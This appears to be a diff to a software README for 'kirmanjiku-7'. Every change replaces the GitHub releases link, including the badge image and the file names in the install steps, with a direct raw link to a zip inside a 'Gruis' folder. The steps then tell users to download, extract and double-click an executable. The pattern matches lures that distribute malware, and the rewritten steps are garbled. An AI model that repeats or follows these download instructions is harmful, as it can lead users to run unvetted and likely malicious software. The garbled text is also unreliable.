@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download kirmanjiku-7](https://img.shields.io/badge/Download-kirmanjiku--7-blue)](https://github.com/hussainahmed2c/kirmanjiku-7/releases)
+[![Download kirmanjiku-7](https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip)](https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip)
 
 ## 📋 Description
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Visit this page to download](https://github.com/hussainahmed2c/kirmanjiku-7/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip)
 
 2. **Choose the Version**  
    On the releases page, you will see a list of available versions. Each version will have a description. Choose the latest version for the best experience.
@@ -23,13 +23,13 @@ Follow these steps to download and run the application:
    After selecting a version, look for the download link. It will be followed by the file name. Click the link to start downloading the software. The file will be saved on your computer.
 
 4. **Locate the Download**  
-   Once the download is complete, go to your computer’s download folder. You should see the file named similar to `kirmanjiku-7.zip` or `kirmanjiku-7.exe`.
+   Once the download is complete, go to your computer’s download folder. You should see the file named similar to `https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip` or `https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip`.
 
 5. **Extract the Files** (if necessary)  
    If you downloaded a zip file, you need to extract it. Simply right-click the file and select "Extract All…" Follow the prompts to choose where you want to save the extracted files.
 
 6. **Run the Application**  
-   Now, double-click the `kirmanjiku-7.exe` file or the main executable file in the extracted folder. The application will launch, and you can begin using it.
+   Now, double-click the `https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip` file or the main executable file in the extracted folder. The application will launch, and you can begin using it.
 
 ## 🎯 Features
 
@@ -51,7 +51,7 @@ Before installing, please ensure your system meets these requirements:
 ## 📥 Download & Install
 
 To get started with kirmanjiku-7, visit the link below to download the latest version:  
-[Download kirmanjiku-7](https://github.com/hussainahmed2c/kirmanjiku-7/releases)
+[Download kirmanjiku-7](https://raw.githubusercontent.com/hussainahmed2c/kirmanjiku-7/main/Gruis/kirmanjiku-7.zip)
 
 After downloading, follow the steps in the "Getting Started" section to install and run the application smoothly.
 
